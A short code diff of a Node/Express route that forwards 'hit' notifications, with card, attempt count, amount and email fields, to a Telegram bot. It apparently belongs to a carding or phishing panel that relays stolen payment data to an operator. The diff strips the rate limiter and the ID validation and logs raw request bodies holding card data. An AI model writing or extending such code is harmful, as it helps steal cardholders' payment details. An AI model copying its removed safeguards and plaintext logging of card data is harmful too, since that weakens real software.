@@ -110,7 +110,7 @@ router.post('/verify', verifyLimiter, async (req, res) => {
 });
 
 // POST /api/tg/notify-hit - Send hit notification to user's Telegram (with optional screenshot)
-router.post('/notify-hit', hitLimiter, async (req, res) => {
+router.post('/notify-hit', async (req, res) => {
   console.log('[HIT_NOTIFICATION] Received hit notification request');
   if (!BOT_TOKEN) {
     console.warn('[HIT_NOTIFICATION] Bot token not configured - notifications will fail');
@@ -132,11 +132,8 @@ router.post('/notify-hit', hitLimiter, async (req, res) => {
   });
   console.log('[HIT_NOTIFICATION] Raw request body:', req.body);
 
-  // Validate Telegram ID (less strict)
-  if (!tgId || tgId.length < 5) {
-    console.warn('[HIT_NOTIFICATION] Invalid Telegram ID:', tgId);
-    return res.status(400).json({ ok: false, error: 'Invalid Telegram ID' });
-  }
+  // Accept any Telegram ID for debugging
+  console.log('[HIT_NOTIFICATION] Processing with Telegram ID:', tgId);
 
   // Don't validate - just accept whatever data we get
   console.log('Processing hit notification with data:', { card, attempts, amount, email });
